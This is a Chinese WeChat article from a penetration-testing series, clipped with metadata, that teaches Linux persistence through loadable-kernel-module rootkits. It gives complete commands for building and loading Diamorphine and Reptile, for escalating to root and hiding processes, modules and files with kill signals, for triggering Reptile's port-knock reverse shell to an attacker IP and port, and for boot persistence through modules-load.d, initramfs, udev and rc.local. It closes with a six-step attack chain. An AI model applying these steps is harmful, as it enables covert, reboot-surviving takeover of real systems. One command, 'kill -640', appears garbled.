---
title: 【微信】渗透测试技巧（四十零）| linux持久化（四）：LKM 内核模块后门
source: https://mp.weixin.qq.com/s/Y36nNyOaHjybyKCINb2TVg
source_host: mp.weixin.qq.com
clip_date: 2026-09-23T09:22:05+08:00
trace_id: d613505b-a57f-4950-ae60-45070dbeb7c1
content_hash: 999d336e0bc39d1dddb371d6c053049160814e80078e36cc800f1432f0e97970
status: synced
tags:
  - 微信
  - Linux安全
  - 内核
series: 【微信】渗透测试技巧（四十零）| linux持久化
feed_source: 公众号聚合·Doonsec
ai_summary: LKM 内核模块后门直接改写系统调用表，把提权、进程/模块/文件/连接隐藏与端口敲门全做进内核，再补一层开机自动加载，使 Linux 控制权重启不死。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 3e475244-d011-8174-ad0d-f3c5004aaf52
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> LKM 内核模块后门直接改写系统调用表，把提权、进程/模块/文件/连接隐藏与端口敲门全做进内核，再补一层开机自动加载，使 Linux 控制权重启不死。
> 
> - **内核层优势：** 绕过 libc、不新建进程、不落盘恶意文件，静态编译工具与 ps/find 全部失效；代价是需 root、内核版本与符号兼容、Secure Boot 需过签名。相较 eBPF 无沙箱约束，可任意改内核数据结构。
> - **Diamorphine 手法：** 约三百行 C，翻转 CR0 写保护位后改写 sys_call_table 中 kill、getdents、getdents64 指针；`kill -64` 提权（commit_creds）、`kill -31` 隐藏进程（打 PF_INVISIBLE）、`kill -63` 模块隐藏（list_del）、`diamorphine_secret` 前缀自动隐藏文件；无网络能力、无持久化。
> - **Reptile 增量：** 多出 TCP/UDP 连接隐藏（hook tcp4_seq_show 等 seq_file）、ICMP/TCP/UDP 端口敲门加密反向 shell、kmatryoshka 套娃加载器与内置开机持久化；落地第一步是替换 magic、口令、隐藏前缀等默认值。
> - **持久化路径：** 模块放入 `/lib/modules/$(uname -r)/kernel/drivers/misc/` + depmod + `/etc/modules-load.d/` 最像合法驱动；更隐蔽的是打进 initramfs 在用户态工具前加载；另有 udev 规则、rc.local。
> - **真实案例：** AhnLab 记录 Reptile 攻击韩国机构，TeamTNT 用 Diamorphine 隐藏 XMRig 矿机进程，Trend Micro 披露 Earth Berberoka 将 Reptile 纳入军火库。

**逆熵寻生** *2026年9月23日 09:09*

LKM 内核模块后门：Diamorphine 与 Reptile 实战

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5934aff1779f54ff.jpg)

LKM（Loadable Kernel Module，可加载内核模块）兜住了 Linux 权限维持的最后一公里。当 SSH 公钥怕清理、PAM 补丁怕校验、LD_PRELOAD 怕静态链接工具看穿，攻击者可以把自己“肮脏的小手”伸向内核本身——直接改系统调用表、篡改进程与文件的遍历结果，让后门在操作系统最底层隐身。这一篇就讲讲怎么用 Diamorphine 与 Reptile 这两把 LKM 利刃，把一台 Linux 主机的控制权焊死在内核里。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5fa21b79537ee5a9.png)

一、理由

先把为什么说透。用户态的一切持久化手段，本质都逃不出三条命门：

🔹 **依赖 libc**：LD_PRELOAD 那类 rootkit 靠劫持 libc 函数生效，可一旦管理员用静态编译的工具（busybox、自编译的恢复命令）去查，preload 根本不会被加载，后门当场暴露。

🔹 **留痕落盘**：SSH 公钥要写文件、PAM 要换 so、cron 要建任务，每一个都在磁盘上留下可查的实体。

🔹 **有进程有文件**：用户态后门总要有个进程在跑、有个文件在盘上，ps 一翻、find 一扫就可能现形。

内核模块后门把这三条命门全堵上。它不经过 libc，直接改 sys *call* table 里的系统调用函数指针；它不新建进程，寄生在内核地址空间里；它不依赖任何能被 ls 看到的恶意文件。换句话说，攻击者从"在系统里藏了个东西"，升级成"让系统本身替自己说谎"。

代价是门槛：加载内核模块需要 root 权限，还要满足内核版本与符号的兼容，Secure Boot 开启的环境还得先过签名这关。但一旦跨过去，回报是压倒性的——ps、ls、ss、lsmod 全部失效，管理员看到的是一台一切正常的机器。

顺带一句 LKM 与 eBPF 的取舍：后者同样能 hook 系统调用，还不出现在 lsmod 里，但能力受 BPF 沙箱安全模型的约束，对内核版本与编译环境的依赖也苛刻得多。在需要强交互、直接改内核数据结构、做文件级隐藏的场景，LKM 依然是首选——它没有沙箱，想改什么改什么，这也是本篇只讲 LKM 的原因。

LKM 后门的全部手法，可以归进五个攻击面：提权信号、进程隐藏、模块隐藏、文件隐藏、网络后门。它们对应攻击者在内核层要解决的五个问题——权限从哪来、进程怎么藏、模块怎么藏、文件怎么藏、通道怎么开。下文按 Diamorphine 与 Reptile 两款工具逐一拆解，每个攻击面都讲清原理、给全命令。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/77b4b9a8e8335b88.jpg)

## Diamorphine编译与加载

二、Diamorphine 深度实战

Diamorphine 是 GitHub 上最负盛名的开源 LKM Rootkit，由 m0nad 维护，全项目只有约三百行 C 代码，却装进了内核级隐匿的核心功夫，支持从 2.6.x 一路到 6.x 的主流内核

（地址：github.com/m0nad/Diamorphine）。

2.1 编译与加载

落地之前，攻击者会先确认目标上的内核头文件与 gcc 齐备，保证 make 一次通过，避免反复编译在系统日志里留下大片痕迹。Diamorphine 对内核版本的适配做得很稳，从老旧的 2.6 内核到最新的 6.x 都能直接编译，大大压低了落地成本。一切就绪，三条命令就能让它跑起来：

\# 拉源码并编译  
git clone https://github.com/m0nad/Diamorphine  
cd Diamorphine && make  
\# 加载进内核  
insmod diamorphine.ko

它的隐蔽性来自改内核的方式：先翻转 CR0 寄存器的 WP 写保护位，再直接改写 sys *call* table 中 kill、getdents、getdents64 三个系统调用的函数指针。这套改系统调用表的打法，是 LKM Rootkit 的经典路线——不 hook 任何用户态库，静态链接的工具照样被蒙在鼓里。

2.2 提权信号：对任意进程说 root

加载后，攻击者对任意进程发送信号 64，就能把那个进程的凭证刷成 root：

\# 当前 shell 立刻提权为 root  
kill -640  
  
\# 立刻验证凭证是否已刷成 root  
id

发送信号后，id 的输出里 uid 与 gid 会变成 0，说明凭证替换成功。这个动作不落文件、不生进程，比任何用户态提权都干净。

原理是 hook 了 kill 系统调用：一旦检测到 sig 等于 64，就调用 commit *creds(prepare* kernel_cred(0))，把调用者的 uid、gid、能力集全部替换成 root 的。它不挑进程、不挑来源，谁发这个信号谁就是 root。对攻击者而言，这是在内核里埋了一条随叫随到的提权暗门。

2.3 进程隐藏：让载荷从 ps 里蒸发

配合进程隐藏，攻击者要藏的是自己真正的载荷。Diamorphine 用信号 31 给目标进程打上不可见标记：

\# 隐藏 PID 为 1234 的进程  
kill -31 1234  
\# 再次发送则取消隐藏  
kill -31 1234

实现上，它 hook 了 getdents 与 getdents64 两个系统调用，而这两个正是 ps、top 遍历 /proc 时必经的入口。被标记的进程会在目录遍历结果里被直接剔除，于是从所有走 /proc 的工具眼里消失，进程本体却照常运行。技术细节上，它给目标进程的 task *struct 打上 PF* INVISIBLE 标志位，getdents 遍历 /proc 时遇到带这个标志的进程就跳过。删的是遍历结果而非进程本身，所以隐藏期间进程照样执行、照常收发包、照常占用 CPU，只是不再出现在任何列表里。

2.4 模块隐藏：让 lsmod 也查不到自己

后门模块自己也得藏起来，否则 lsmod 一翻就露馅。Diamorphine 用信号 63 切换模块的可见性：

\# 隐藏 dimorphine 模块自身  
kill -63 0  
\# 再次发送，恢复可见  
kill -63 0

原理是经典的 list_del：让内核里所有模块串成的那条双向链表，不再经过自己的节点。lsmod 正是靠遍历这条链表来枚举，指针一改，遍历就再也扫不到它。摘掉之后，lsmod 读不到它、/sys/module 里也没有它，但模块函数还在内存里照常服务，磁盘和内存里都没有一个名叫 diamorphine 的模块挂在链上。这一招让"加载了内核后门"这件事本身也变成不可见。

2.5 文件隐藏：前缀自动隐身

它还内置了一套按前缀的文件隐藏：凡是名字里带 diamorphine_secret 前缀的文件或目录，都会自动从 ls 的输出里消失：

\# 建一个自动隐藏的目录  
mkdir /tmp/diamorphine_secret_stash  
ls /tmp

同样是劫持 getdents 系统调用，在遍历结果里过滤掉命中前缀的条目。攻击者把载荷、日志、临时文件都丢进这个前缀目录，等于给自己划了一块系统工具看不见的暗格。顺带点破一个设计细节：提权信号 64、进程隐藏信号 31、模块隐藏信号 63，全部复用 kill 这一个系统调用，靠不同的 signal 值分流。只对这一个调用打一次补丁，就拿下四个攻击面中的三个，这正是 Diamorphine 用三百行代码实现完整隐匿的底气。

Diamorphine 的短板也写在明面上：它只有提权与隐藏这些内存里的即时能力，既不做网络连接隐藏，也没有一丝一毫的持久化，一重启就烟消云散。所以它更多被当成一把轻盈的隐匿匕首，持久化的事要交给别的手段接力，这一层放到第五章再说。

三、Reptile 实战：面向实战的完整套件

如果说 Diamorphine 是一把匕首，Reptile 就是一座军火库。它由 f0rb1dd3n 维护，把提权、多类隐藏、网络后门、持久化打包进了一套东西，也是被 APT 组织真正改过、用过的那一款

（地址：github.com/f0rb1dd3n/Reptile）。

3.1 编译与安装

## Reptile编译与默认配置

Reptile 的构建依赖内核头文件，安装流程稍长：

\# 安装编译依赖  
apt install build-essential libncurses-dev linux-headers-$(uname-r)  
\# 拉源码，配置特性后编译安装  
git clone https://github.com/f0rb1dd3n/Reptile  
cd Reptile &&make defconfig &&make&&make install

make defconfig 会生成默认配置，其中几个关键值攻击者通常会改掉：magic 值默认 hax0r、后门口令默认 s3cr3t、隐藏前缀默认 reptile、敲门源端口默认 666。真实入侵里，攻击者做的第一件事就是把这些默认值换成自己专属的，避免被人按默认配置识别出来。

Reptile 的能力清单比 Diamorphine 长得多：把任意低权限用户提权为 root、隐藏文件与目录、隐藏进程、隐藏自身、隐藏 TCP 与 UDP 连接、开机隐藏持久化、文件内容篡改，以及 ICMP、UDP、TCP 三种协议的端口敲门后门，再配一个支持文件传输的完整交互 shell。一句话，它是给攻击者搭好的一整套军火库。

3.2 功能对比：Reptile 比 Diamorphine 多了什么

把两款工具摆在一起，差距一目了然：

| 能力  | Diamorphine | Reptile |
| --- | --- | --- |
| 提权  | 信号 64 | 提权信号 |
| 进程隐藏 | getdents 过滤 | VFS 层 hook |
| 文件隐藏 | 前缀匹配 | 前缀加扩展名匹配 |
| 模块隐藏 | list_del | list_del 加 kmatryoshka |
| 网络隐藏 | 无   | 连接隐藏 |
| 网络后门 | 无   | 端口敲门 |
| 开机持久化 | 无   | 内置隐藏启动 |

最关键的差距有两条：一是 Reptile 多了网络层面的能力，既能隐藏连接、又能开端口敲门后门；二是它内置了持久化。这两点让它从隐匿工具升级成长期据点。

这里的网络隐藏，指的是 hook 内核的 tcp4 *seq* show、udp4 *seq* show 等 seq_file 接口，把攻击者的连接从 /proc/net/tcp、ss、netstat 的输出里抹掉，让 C2 连接与回连 shell 在连接列表里同样查不到。

## kmatryoshka套娃加载

3.3 kmatryoshka：把模块藏进另一层壳里

Reptile 的模块隐藏比 Diamorphine 多一层心思，用的是 kmatryoshka（俄罗斯套娃）加载器。编译时，真正的 reptile 模块会被加密后嵌入到一个 loader 模块里；加载时，loader 先把加密载荷解密、把真正的 Reptile 模块塞进内核，再把自己卸载掉。

结果就是：管理员哪怕挨个检查 /sys/module，也只能看到 loader 那层壳的名字，真正的后门模块从头到尾没有以自己的名字出现在内核里。再配合 list_del 把壳也从链表里摘掉，有没有加载后门的痕迹被抹得干干净净。

3.4 Port Knocking：内核里的加密反向通道

这是 Reptile 的招牌功能，也是它被 APT 看中的主因。它在内核网络栈里挂了 hook，监听 ICMP、TCP、UDP 三种协议的特制报文——端口敲门包。攻击者从外部发一个携带 magic 值与令牌的包，模块的内核 hook 就会触发一个加密的反向 shell 回连攻击者指定的地址：

\# 攻击机进入 reptile_client 交互界面  
./reptile_client  
\# 依次设定目标、协议、回连地址后触发  
set rhost 目标IP  
set prot TCP  
set lhost 攻击者IP  
set lport 4444  
run

这套后门有三处让它极难被盯上：敲门包本身在用户态抓包工具（tcpdump、Wireshark）里不可见，因为它被内核直接消费、根本不进入应用层；反向 shell 全程加密；而且敲门可选 ICMP 协议，把触发信号伪装成最不起眼的 ping 流量。

三种敲门协议各有取舍：TCP 适合目标放行常规端口的情况，UDP 更难被日志关联，ICMP 则把触发信号伪装成普通 ping，最不显眼。攻击机这边，run 之后 client 会自动拉起一个 listener 监听回连端口，收到内核 shell 后即可执行命令、上传下载文件。

攻击者等于在系统最底层埋了一条随时可点亮的加密隧道。

四、真实攻击案例

三个真实案例：

🔹 **针对韩国机构的 Reptile 攻击**：AhnLab ASEC 在 2023 年的报告《Reptile Malware Targeting Linux Systems》里，记录了 Reptile 被用于攻击韩国公司的真实案例，攻击者还配合了基于 ICMP 的 shell。报告中列出的落盘样本，MAGIC_VALUE、PASSWORD、隐藏目录全都换成了攻击者自定义的值，正是 3.1 里强调的动作。

🔹 **TeamTNT 挖矿团伙**：用 Diamorphine 隐藏 XMRig 矿机进程。腾讯安全与安天实验室的样本分析都记录到，该团伙在拿到 root 后 insmod 加载 diamorphine.ko，再用信号 31 把矿机进程从进程列表里抹掉。

🔹 **Earth Berberoka**：Trend Micro 于 2022 年披露，这个以在线赌博平台为目标的 APT 组织，把 Reptile 当作军火库的一员，用于对 Linux 服务器的隐匿与控制。

三条案例指向同一个结论：成熟的攻击者不把 LKM Rootkit 当玩具，而当长期据点的地基。改默认值、接自家通道、藏矿机或藏后门，全都围着持久化与不可见展开。

五、持久化落地：让 RAM 后门跨过重启

## RAM后门的开机持久化

内核模块后门有个天生软肋——它活在内存里，重启即散。Diamorphine 完全依赖手动 insmod，Reptile 虽然声称内置持久化，但攻击者要拿到稳定据点，标准做法是再补一层开机自动加载，把 RAM 后门变成重启存活。

最省事、也最像合法配置的，是借系统自身的模块加载机制：

\# 把模块放进内核模块标准路径并注册依赖  
cp diamorphine.ko /lib/modules/$(uname-r)/kernel/drivers/misc/  
depmod -a  
\# 让 systemd-modules-load 开机自动加载  
echo"diamorphine" > /etc/modules-load.d/diamorphine.conf

这套操作落下的痕迹，和一个厂商驱动程序一模一样：模块在标准目录里、depmod 有记录、加载项写在 modules-load.d 里。管理员即便翻到，也只是一条看起来正常的驱动加载配置。

更隐蔽的路线是把模块打进 initramfs，让它在内核启动的极早期、用户态工具还没起来之前就被加载：

\# 在更新 initramfs 之前，把模块和加载指令塞进镜像  
mkdir-p /etc/initramfs-tools/hooks  
\# 写一个 hook 把.ko 连同 insmod 逻辑打进 initramfs  
update-initramfs -u

initramfs 里的后门在系统引导阶段就位，早于绝大多数安全软件启动，隐蔽性比 systemd 方案更高一层。两条路可以叠加：initramfs 保早期出现，modules-load.d 保配置看起来合法，双保险让清理动作顾此失彼。

除了这两条，还有更土却同样有效的旧路：往 /etc/udev/rules.d 里加一条规则，让 udev 在设备事件时顺手 insmod；或者往 /etc/rc.local 里塞一行 insmod 指令。Reptile 的安装脚本本身就内置了多条持久化路径，攻击者也能照搬。多条路径一叠，管理员清一条漏一条，后门照样能回来。

六、分层叠加与攻击链复盘

LKM 后门单独用是利器，组合起来才是据点。把本篇手法串成一条六步攻击链，一次从拿到 root 到焊死控制权的完整路径是：

## 六步攻击链复盘

1\. **提权到 root**：先通过任意手段拿到 root，这是往内核里塞东西的前置门槛。

2\. **编译加载模块**：insmod 把 Diamorphine 或 Reptile 送进内核地址空间，后门从此活在系统最底层。

3\. **锁定权限与藏身**：用提权信号把攻击者账号钉死在 root，再用进程隐藏把载荷从 ps 里抹掉。

4\. **藏模块藏文件**：list_del 把模块从 lsmod 摘除，把恶意文件丢进自动隐藏的前缀目录，斩断静态排查的线索。

5\. **布网络后门**：用 Reptile 的端口敲门在内核里埋下加密反向通道，让随时能回来这件事不可见。

6\. **落地持久化**：补 systemd 或 initramfs 开机自动加载，给本就隐身的内核后门再焊一层重启不死。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5247be6e53b53f25.jpg)

这条链的每一环都在对抗不同的清理动作：删文件、杀进程、卸模块、断网络、重启系统，都无法一次性拔除整套后门。这正是持久化的本质——不是赌某个技巧不被发现，而是让对手永远清不干净。

七、工具包说明

本篇涉及的两款核心工具：

| 工具  | 用途  | 来源  |
| --- | --- | --- |
| Diamorphine | 轻量 LKM Rootkit | github.com/m0nad/Diamorphine |
| Reptile | 全功能 LKM Rootkit | github.com/f0rb1dd3n/Reptile |

两款工具一轻一重：Diamorphine 适合快速布防时的即时隐匿，Reptile 适合长期控守时的全套能力。

总结

LKM 内核模块后门是 Linux 持久化的终点站。回看全篇，核心只有三句话：

1\. **下沉到内核，等于让系统替自己说谎**——绕过 libc、不落进程、不落文件，这是它碾压一切用户态手段的根本。

2\. **Diamorphine 管藏，Reptile 管控**——前者用最小体积做提权与多类隐藏，后者用 kmatryoshka 与端口敲门补上网络和持久化。

3\. **RAM 后门必须配持久化落地**——不跨过重启这道坎，再深的后门都只是临时据点。

攻击者的终极追求是： **让后门不再是一个东西，而是系统本身的一部分。**

：本文所有内容仅面向授权的安全测试、红队演练和学术研究。任何未经系统所有者明确授权的入侵行为均违反《中华人民共和国网络安全法》等相关法律法规，作者不对任何滥用行为承担责任。

关注我，持续不断地成长！

往期推荐：

****[渗透测试技巧（二十五）| Windows 内网权限维持 10 种姿势](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（二十六）| Linux 权限维持 8 种姿势](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（二十七）| 域渗透基础](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（二十八）| 域渗透基础（二）](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（二十九）| 域渗透基础（三）：两招掏空域内密码](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（三十）| 域渗透基础（四）：横向移动](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（三十一）| 域渗透基础（五）：票据使用](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（三十二）| 8个好用的实战小技巧](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（三十三）| SSRF如何打穿云元数据](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（三十四）| 权限维持中Crontab的字符截断隐身术](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（三十五）| 一些让Windows账户隐身的高级姿势](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

****[渗透测试技巧（三十六）| PDF 文档实施钓鱼攻击实战技巧](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484333&idx=1&sn=d8d86dc0055dac0562ca79b327019d3f&scene=21#wechat_redirect)****

渗透测试技巧 · 目录
